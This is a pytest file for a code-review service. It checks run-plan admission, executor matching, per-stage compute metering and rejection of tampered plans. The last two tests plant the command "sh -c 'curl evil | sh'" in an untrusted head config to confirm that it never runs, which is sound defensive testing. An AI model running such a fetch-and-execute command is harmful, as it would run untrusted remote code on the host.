"""Hermetic executors run only what the effective run plan schedules, and meter per stage."""

from __future__ import annotations

from collections.abc import Mapping
from dataclasses import replace
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from lemoncrow.pro.capabilities.review.capability_catalog import DynamicTarget
from lemoncrow.pro.capabilities.review.planned_execution import (
    PlannedExecutionRefused,
    admit_planned_execution,
    discovered_surface_entry_id,
    persisted_plan,
    stage_compute,
)
from lemoncrow.pro.capabilities.review.run_plan import ManualPick, RunPlan
from lemoncrow.pro.capabilities.review.surfaces import ReviewSurface
from lemoncrow.pro.capabilities.review.test_impact import IMPACT_MAP_ENTRY
from lemoncrow.pro.environment.execution import (
    RUN_ON_BY_EXECUTOR_CLASS,
    ExecutionSubject,
    ExecutorClass,
    StageOutcome,
    run_on_for_locus,
)
from lemoncrow.pro.environment.runners import RunnerRegistry, SurfaceRunResult
from tests.gateway.test_review_execution_contract import _result
from tests.gateway.test_review_run_plan_api import _RUNTIME, HEADERS, _get, _review

_AUTO = f"{_RUNTIME}review:\n  capabilities:\n    deep_runtime: auto\n"
_VALIDATE = {"provider": "service", "surface_id": "checks:tests", "side": "new"}


def _typed_execution(review_id: str, revision_id: str) -> dict[str, Any]:
    return _result(
        subject=ExecutionSubject(review_id=review_id, revision_id=revision_id, side="new", snapshot_identity="t"),
        stages=(
            StageOutcome("fetch", "passed", network="registry_only", duration_ms=2000),
            StageOutcome("build", "passed", duration_ms=3000),
            StageOutcome("run", "passed", exit_code=0, duration_ms=4000, output="ok"),
        ),
    ).to_wire()


class _Runner:
    runner_id = "fixture-runner"

    def __init__(self, execution: dict[str, Any] | None = None) -> None:
        self.ran: list[str] = []
        self.execution = execution

    def setup_candidates(self, _repo_root: Path) -> tuple[()]:
        return ()

    def run(self, _context: Any, runtime: Any, surface: Any, *, side: str) -> SurfaceRunResult:
        self.ran.append(surface.id)
        return SurfaceRunResult(
            surface.id,
            surface.provider,
            side,
            "passed",
            "ok",
            self.runner_id,
            runtime.id,
            exit_code=0,
            duration_ms=4000,
            data={"execution": self.execution} if self.execution is not None else {},
        )


def _compute(review: Any) -> list[tuple[str, str, str, float, int]]:
    rows = _get(review, "run-plan").json()["compute"]["rows"]
    # Execution compute only: building the plan's test-impact map is metered on its own row.
    return [
        (row["entry_id"], row["executor"], row["stage"], row["compute_minutes"], row["runs"])
        for row in rows
        if row["entry_id"] != IMPACT_MAP_ENTRY
    ]


def test_executor_classes_map_to_run_plan_executors_and_registries_state_theirs() -> None:
    assert {key.value: value for key, value in RUN_ON_BY_EXECUTOR_CLASS.items()} == {
        "author_machine": "local",
        "customer_worker": "worker",
        "managed_sandbox": "managed",
    }
    assert [run_on_for_locus(locus) for locus in ("local", "customer", "managed")] == ["local", "worker", "managed"]
    with pytest.raises(ValueError, match="unknown execution locus"):
        run_on_for_locus("elsewhere")
    assert RunnerRegistry(()).run_on == "local"
    assert RunnerRegistry((), executor_class=ExecutorClass.MANAGED_SANDBOX).run_on == "managed"
    # A customer-operated deployment's managed plane: customer compute on the plan's managed executor.
    customer_managed = RunnerRegistry((), executor_class=ExecutorClass.CUSTOMER_WORKER, run_on="managed")
    assert (customer_managed.executor_class, customer_managed.run_on) == (ExecutorClass.CUSTOMER_WORKER, "managed")
    with pytest.raises(ValueError, match="unknown run plan executor locus"):
        RunnerRegistry((), run_on="anywhere")


def test_admission_needs_a_persisted_plan_that_runs_the_entry_on_this_executor(tmp_path: Path) -> None:
    runner = _Runner()
    review = _review(tmp_path, base_config=_AUTO, runner_registry=RunnerRegistry((runner,)))
    assert (
        review.client.post(
            f"/api/reviews/{review.review_id}/runtime-validation",
            headers=HEADERS,
            json={"revision_id": review.revision_id, **_VALIDATE},
        ).status_code
        == 201
    )
    plan = persisted_plan(review.store, review.revision_id)
    assert plan is not None
    assert admit_planned_execution(plan, "surface:checks", run_on="local").executor == "local"
    with pytest.raises(PlannedExecutionRefused, match="planned on the local executor, not managed"):
        admit_planned_execution(plan, "surface:checks", run_on="managed")
    with pytest.raises(PlannedExecutionRefused, match="not addressable"):
        admit_planned_execution(plan, "surface:elsewhere", run_on="local")
    with pytest.raises(PlannedExecutionRefused, match="no persisted effective run plan"):
        admit_planned_execution(None, "surface:checks", run_on="local")
    skipped = replace(
        plan,
        entries=tuple(
            (
                replace(row, status="skipped", reason="deep_runtime family turned off")
                if row.id == "surface:checks"
                else row
            )
            for row in plan.entries
        ),
    )
    with pytest.raises(PlannedExecutionRefused, match="family turned off"):
        admit_planned_execution(skipped, "surface:checks", run_on="local")
    assert persisted_plan(review.store, "rr-missing") is None
    # A tampered persisted plan (content no longer matches its digest) reads as no plan: refused.
    from lemoncrow.pro.capabilities.review.run_plan import RUN_PLAN_KIND, RUN_PLAN_SCOPE
    from lemoncrow.pro.capabilities.review.store import DerivedResult

    forged = plan.to_wire()
    forged["entries"] = [
        {**row, "executor": "managed"} if row["id"] == "surface:checks" else row for row in forged["entries"]
    ]
    review.store.put_derived_results(
        [DerivedResult(review.review_id, review.revision_id, RUN_PLAN_KIND, RUN_PLAN_SCOPE, plan.digest, forged)]
    )
    assert persisted_plan(review.store, review.revision_id) is None


def test_an_in_process_executor_refuses_an_entry_planned_on_another_executor(tmp_path: Path) -> None:
    runner = _Runner()
    hosted = RunnerRegistry((runner,), executor_class=ExecutorClass.MANAGED_SANDBOX)
    review = _review(tmp_path, base_config=_AUTO, runner_registry=hosted)
    response = review.client.post(
        f"/api/reviews/{review.review_id}/runtime-validation",
        headers=HEADERS,
        json={"revision_id": review.revision_id, **_VALIDATE},
    )
    assert response.status_code == 409, response.text
    assert response.json()["detail"] == (
        "runtime validation of surface:checks is not in the effective run plan: "
        "planned on the local executor, not managed"
    )
    assert runner.ran == [] and _compute(review) == []


def test_in_process_runs_meter_compute_per_fetch_build_and_run_stage(tmp_path: Path) -> None:
    runner = _Runner()
    review = _review(tmp_path, base_config=_AUTO, runner_registry=RunnerRegistry((runner,)))
    runner.execution = _typed_execution(review.review_id, review.revision_id)
    response = review.client.post(
        f"/api/reviews/{review.review_id}/runtime-validation",
        headers=HEADERS,
        json={"revision_id": review.revision_id, **_VALIDATE},
    )
    assert response.status_code == 201, response.text
    assert runner.ran == ["checks:tests"]
    # Stage durations exceed this fast run's wall time, so no setup remainder.
    assert _compute(review) == [
        ("surface:checks", "local", "build", 0.05, 1),
        ("surface:checks", "local", "fetch", 0.033, 1),
        ("surface:checks", "local", "run", 0.067, 1),
    ]

    surface_run = review.client.post(
        f"/api/reviews/{review.review_id}/surface-run",
        headers=HEADERS,
        params={"provider": "service", "surface_id": "checks:tests", "side": "new", "revision_id": review.revision_id},
    )
    assert surface_run.status_code == 200, surface_run.text
    assert [row[2:] for row in _compute(review)] == [("build", 0.1, 2), ("fetch", 0.067, 2), ("run", 0.133, 2)]


_REQUIRED_BROWSER = """browser_checks:
  trusted_origins: ["https://preview.example.test"]
  scenarios:
    - id: auth-required
      title: Auth required
      route: /auth
      paths: ["src/auth.py"]
      required: true
"""
_DISCOVERED = ReviewSurface(
    id="api/status",
    provider="fixture",
    kind="api.request",
    title="GET /status",
    runtime="fixture-runtime",
    capabilities=("source", "execute", "results"),
)


def _surface_run(review: SimpleNamespace, **params: str) -> Any:
    return review.client.post(
        f"/api/reviews/{review.review_id}/surface-run",
        headers=HEADERS,
        params={"side": "new", "revision_id": review.revision_id, **params},
    )


def _row(plan: Mapping[str, Any], entry_id: str) -> dict[str, Any]:
    found = next((row for row in plan["entries"] if row["id"] == entry_id), None)
    assert found is not None, entry_id
    return dict(found)


def _running(plan: Mapping[str, Any]) -> set[str]:
    return {row["id"] for row in plan["entries"] if row["status"] == "run"}


def _discovered_only(monkeypatch: pytest.MonkeyPatch) -> list[str]:
    """Discovery finds a surface the trusted base does not configure."""

    import lemoncrow.pro.capabilities.review.runner_host as runtimes_module
    import lemoncrow.pro.capabilities.review.surfaces as surfaces_module

    ran: list[str] = []

    class Registry:
        def discover(self, _context: Any) -> tuple[Any, ...]:
            return (_DISCOVERED,)

    class Runners:
        def run(self, _context: Any, selected: ReviewSurface, *, side: str) -> SurfaceRunResult:
            ran.append(selected.id)
            return SurfaceRunResult(
                selected.id, selected.provider, side, "passed", "ok", runner="fixture", runtime=selected.runtime
            )

    monkeypatch.setattr(surfaces_module, "built_in_registry", lambda: Registry())
    monkeypatch.setattr(runtimes_module, "built_in_runner_registry", lambda: Runners())
    return ran


def test_a_reviewer_run_is_an_add_only_manual_amendment_that_keeps_policy_floors(tmp_path: Path) -> None:
    runner = _Runner()
    review = _review(
        tmp_path,
        base_config=f"{_RUNTIME}{_REQUIRED_BROWSER}review:\n  effort: quick\n",
        runner_registry=RunnerRegistry((runner,)),
    )
    before = _get(review, "run-plan").json()["plan"]
    assert _row(before, "surface:checks")["status"] != "run"
    floor = _row(before, "browser:auth-required")
    assert (floor["origin"], floor["required"]) == ("policy_floor", True)

    response = _surface_run(review, provider="service", surface_id="checks:tests")
    assert response.status_code == 200, response.text
    assert runner.ran == ["checks:tests"]
    planned = response.json()["run_plan"]
    after = _get(review, "run-plan").json()["plan"]
    # The executed plan is the displayed plan, and its cost delta was previewed.
    assert (planned["entry"], planned["digest"]) == ("surface:checks", after["digest"])
    assert after["parent_digest"] == before["digest"]
    assert planned["incremental"]["minutes"] > 0
    added = _row(after, "surface:checks")
    assert (added["status"], added["origin"], added["executor"]) == ("run", "manual", "local")
    # Add-only: nothing scheduled is dropped and the policy floor is untouched.
    assert _running(before) <= _running(after)
    assert _row(after, "browser:auth-required") == floor
    assert after["required_blockers"] == before["required_blockers"]


@pytest.mark.parametrize(
    ("config", "status"),
    [
        ("review:\n  capabilities:\n    deep_runtime: off\n", "skipped"),
        ("review:\n  budget:\n    per_review_minutes: 0.001\n", "limited_by_budget"),
    ],
)
def test_a_reviewer_run_the_plan_will_not_schedule_is_refused_before_it_executes(
    tmp_path: Path, config: str, status: str
) -> None:
    runner = _Runner()
    review = _review(tmp_path, base_config=f"{_RUNTIME}{config}", runner_registry=RunnerRegistry((runner,)))
    response = _surface_run(review, provider="service", surface_id="checks:tests")
    assert response.status_code == 409, response.text
    assert response.json()["detail"].startswith("surface run of surface:checks is not in the effective run plan: ")
    assert runner.ran == [] and _compute(review) == []
    assert _row(_get(review, "run-plan").json()["plan"], "surface:checks")["status"] == status


def test_a_discovered_surface_is_its_own_manual_pick_and_survives_a_reload(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ran = _discovered_only(monkeypatch)
    review = _review(tmp_path)
    response = _surface_run(review, provider="fixture", surface_id="api/status")
    assert response.status_code == 200, response.text
    assert ran == ["api/status"]
    planned = response.json()["run_plan"]
    assert planned["entry"] == "surface:fixture:api/status"

    plan = persisted_plan(review.store, review.revision_id)
    assert plan is not None and plan.digest == planned["digest"]
    target = DynamicTarget(id="fixture:api/status", title="GET /status")
    assert [(pick.id, pick.target) for pick in plan.manual] == [("surface:fixture:api/status", target)]
    entry = plan.entry("surface:fixture:api/status")
    assert entry is not None and (entry.status, entry.origin, entry.executor) == ("run", "manual", "local")
    rebuilt = RunPlan.from_wire(plan.to_wire())
    assert (rebuilt.digest, rebuilt.manual) == (plan.digest, plan.manual)
    assert rebuilt.manual[0] == ManualPick("surface:fixture:api/status", rebuilt.manual[0].depth, target=target)
    # A later amendment rebuilds from the persisted picks: the discovered entry stays planned.
    later = review.client.post(
        f"/api/reviews/{review.review_id}/run-plan/run-specific",
        headers=HEADERS,
        json={"expected_revision_id": review.revision_id, "entries": ["ai.hypotheses"], "confirm": True},
    )
    assert later.status_code == 200, later.text
    assert _row(later.json()["plan"], "surface:fixture:api/status")["status"] == "run"

    # Running it again re-admits the same pick; the plan holds it once.
    assert _surface_run(review, provider="fixture", surface_id="api/status").status_code == 200
    again = persisted_plan(review.store, review.revision_id)
    assert again is not None
    assert [row.id for row in again.entries].count("surface:fixture:api/status") == 1
    assert ran == ["api/status", "api/status"]


def test_a_discovered_surface_id_outside_the_catalog_alphabet_gets_a_stable_entry_id() -> None:
    odd = SimpleNamespace(provider="fixture", id="GET /a b?c")
    entry_id = discovered_surface_entry_id(odd)
    assert entry_id.startswith("surface:discovered-") and len(entry_id) == len("surface:discovered-") + 24
    assert discovered_surface_entry_id(SimpleNamespace(provider="fixture", id="GET /a b?c")) == entry_id
    assert discovered_surface_entry_id(SimpleNamespace(provider="fixture", id="api/status")) == (
        "surface:fixture:api/status"
    )


def test_run_specific_previews_and_confirms_a_discovered_surface(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    ran = _discovered_only(monkeypatch)
    review = _review(tmp_path)

    def run_specific(entries: list[str], **extra: Any) -> Any:
        return review.client.post(
            f"/api/reviews/{review.review_id}/run-plan/run-specific",
            headers=HEADERS,
            json={"expected_revision_id": review.revision_id, "entries": entries, **extra},
        )

    preview = run_specific(["surface:fixture:api/status"])
    assert preview.status_code == 200, preview.text
    assert preview.json()["confirmed"] is False
    assert preview.json()["preview"]["incremental"]["minutes"] > 0
    confirmed = run_specific(["surface:fixture:api/status"], confirm=True)
    assert confirmed.status_code == 200, confirmed.text
    added = _row(confirmed.json()["plan"], "surface:fixture:api/status")
    assert (added["status"], added["origin"]) == ("run", "manual")
    assert [row["action"] for row in confirmed.json()["next"]] == ["surface_run"]
    # Confirming plans the run; the reviewer's surface run executes it.
    assert ran == []
    assert run_specific(["surface:fixture:elsewhere"]).status_code == 422


def test_stage_compute_sums_to_wall_time_and_falls_back_for_untyped_runs() -> None:
    typed = _typed_execution("review-one", "rr-one")
    assert stage_compute(typed, wall_seconds=12.5, fallback_stage="runtime_validation") == (
        ("fetch", 2.0),
        ("build", 3.0),
        ("run", 4.0),
        ("setup", 3.5),
    )
    assert stage_compute(None, wall_seconds=1.5, fallback_stage="runtime_validation") == (("runtime_validation", 1.5),)
    assert stage_compute({"schema_version": 99}, wall_seconds=2.0, fallback_stage="surface_run") == (
        ("surface_run", 2.0),
    )
    assert stage_compute(None, wall_seconds=float("nan"), fallback_stage="surface_run") == (("surface_run", 0.0),)


class _CommandRecorder(_Runner):
    def __init__(self) -> None:
        super().__init__()
        self.commands: list[tuple[str, ...]] = []

    def run(self, context: Any, runtime: Any, surface: Any, *, side: str) -> SurfaceRunResult:
        self.commands.append(tuple(runtime.strings("command")))
        return super().run(context, runtime, surface, side=side)


def test_surface_run_never_executes_a_runtime_only_the_head_defines(tmp_path: Path) -> None:
    """SL-5: head content never defines what runs."""

    runner = _CommandRecorder()
    hostile = _RUNTIME.replace("[python, -m, safe_check]", "[sh, -c, 'curl evil | sh']")
    review = _review(tmp_path, base_config="", head_config=hostile, runner_registry=RunnerRegistry((runner,)))

    response = _surface_run(review, provider="service", surface_id="checks:tests")

    assert response.status_code == 422, response.text
    assert "not defined by the trusted base" in response.text
    assert runner.commands == []


def test_surface_run_executes_the_trusted_base_command_not_the_head_edit(tmp_path: Path) -> None:
    runner = _CommandRecorder()
    edited = _RUNTIME.replace("[python, -m, safe_check]", "[sh, -c, 'curl evil | sh']")
    review = _review(tmp_path, base_config=_RUNTIME, head_config=edited, runner_registry=RunnerRegistry((runner,)))

    response = _surface_run(review, provider="service", surface_id="checks:tests")

    assert response.status_code == 200, response.text
    assert runner.commands == [("python", "-m", "safe_check")]
